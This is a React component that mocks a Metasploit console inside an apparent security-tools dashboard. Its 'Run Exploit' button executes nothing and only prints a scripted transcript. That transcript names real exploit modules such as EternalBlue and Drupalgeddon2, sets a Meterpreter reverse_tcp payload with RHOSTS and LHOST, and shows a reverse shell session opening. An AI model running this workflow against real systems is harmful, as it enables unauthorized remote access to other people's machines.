import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import { Zap, Play, Square, Search } from 'lucide-react';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { ScrollArea } from '@/components/ui/scroll-area';

export function MetasploitRunner() {
  const [command, setCommand] = useState('');
  const [output, setOutput] = useState('');
  const [isRunning, setIsRunning] = useState(false);
  const [selectedExploit, setSelectedExploit] = useState('');

  const exploits = [
    { id: 'ms17_010', name: 'EternalBlue', path: 'exploit/windows/smb/ms17_010_eternalblue', rank: 'excellent' },
    { id: 'struts', name: 'Apache Struts', path: 'exploit/multi/http/struts2_content_type_ognl', rank: 'excellent' },
    { id: 'tomcat', name: 'Tomcat Manager', path: 'exploit/multi/http/tomcat_mgr_upload', rank: 'excellent' },
    { id: 'drupal', name: 'Drupalgeddon2', path: 'exploit/unix/webapp/drupal_drupalgeddon2', rank: 'excellent' },
  ];

  const runExploit = () => {
    setIsRunning(true);
    setOutput('');
    
    const lines = [
      `msf6 > use ${selectedExploit}`,
      `[*] Using configured payload windows/x64/meterpreter/reverse_tcp`,
      `msf6 exploit(${selectedExploit.split('/').pop()}) > set RHOSTS 192.168.1.100`,
      `RHOSTS => 192.168.1.100`,
      `msf6 exploit(${selectedExploit.split('/').pop()}) > set LHOST 192.168.1.10`,
      `LHOST => 192.168.1.10`,
      `msf6 exploit(${selectedExploit.split('/').pop()}) > exploit`,
      ``,
      `[*] Started reverse TCP handler on 192.168.1.10:4444`,
      `[*] Sending stage (200262 bytes) to 192.168.1.100`,
      `[*] Meterpreter session 1 opened`,
      ``,
      `meterpreter > `
    ];

    let currentLine = 0;
    const interval = setInterval(() => {
      if (currentLine < lines.length) {
        setOutput(prev => prev + lines[currentLine] + '\n');
        currentLine++;
      } else {
        setIsRunning(false);
        clearInterval(interval);
      }
    }, 500);
  };

  return (
    <div className="h-full flex flex-col bg-background">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between p-3 sm:p-4 border-b border-border bg-card/30 backdrop-blur-sm gap-2">
        <div className="flex items-center gap-2 sm:gap-3">
          <Zap className="h-4 w-4 sm:h-5 sm:w-5 text-primary" />
          <div>
            <h3 className="font-semibold text-sm sm:text-base text-foreground">Metasploit Framework</h3>
            <p className="text-xs text-muted-foreground hidden sm:block">Exploitation and penetration testing</p>
          </div>
        </div>
        <Badge variant="secondary" className="text-xs w-fit">Exploitation</Badge>
      </div>

      <Tabs defaultValue="exploits" className="flex-1 flex flex-col">
        <TabsList className="mx-3 sm:mx-4 mt-3 sm:mt-4 grid w-auto grid-cols-3 h-auto">
          <TabsTrigger value="exploits" className="text-xs px-2 py-2">Exploits</TabsTrigger>
          <TabsTrigger value="payloads" className="text-xs px-2 py-2">Payloads</TabsTrigger>
          <TabsTrigger value="console" className="text-xs px-2 py-2">Console</TabsTrigger>
        </TabsList>

        <TabsContent value="exploits" className="flex-1 p-3 sm:p-4 overflow-auto space-y-3 sm:space-y-4">
          <div className="flex items-center gap-2">
            <Search className="h-4 w-4 text-muted-foreground" />
            <Input placeholder="Search exploits..." className="flex-1 h-8 sm:h-9 text-sm" />
          </div>

          <ScrollArea className="h-[300px] sm:h-[400px] border border-border rounded-lg">
            <div className="p-2 space-y-2">
              {exploits.map(exploit => (
                <div
                  key={exploit.id}
                  onClick={() => setSelectedExploit(exploit.path)}
                  className={`p-3 rounded-lg border cursor-pointer transition-all ${
                    selectedExploit === exploit.path
                      ? 'border-primary bg-primary/10'
                      : 'border-border hover:border-border-hover hover:bg-accent/50'
                  }`}
                >
                  <div className="flex items-start justify-between gap-2">
                    <div className="flex-1 min-w-0">
                      <h4 className="font-medium text-sm text-foreground truncate">{exploit.name}</h4>
                      <p className="text-xs text-muted-foreground font-mono mt-1 truncate">{exploit.path}</p>
                    </div>
                    <Badge variant="secondary" className="text-xs shrink-0">{exploit.rank}</Badge>
                  </div>
                </div>
              ))}
            </div>
          </ScrollArea>

          <div className="flex gap-2">
            <Button
              onClick={runExploit}
              disabled={!selectedExploit || isRunning}
              size="sm"
              className="flex-1 sm:flex-none"
            >
              <Play className="h-4 w-4 mr-2" />
              {isRunning ? 'Running...' : 'Run Exploit'}
            </Button>
          </div>
        </TabsContent>

        <TabsContent value="console" className="flex-1 p-3 sm:p-4 overflow-hidden flex flex-col">
          <div className="flex-1 bg-muted/20 rounded-lg p-2 sm:p-3 font-mono text-xs sm:text-sm overflow-auto border border-border">
            <pre className="whitespace-pre-wrap text-foreground">
              {output || 'msf6 > \n\nSelect an exploit and click Run to start...'}
              {isRunning && <span className="animate-pulse">█</span>}
            </pre>
          </div>
        </TabsContent>
      </Tabs>
    </div>
  );
}
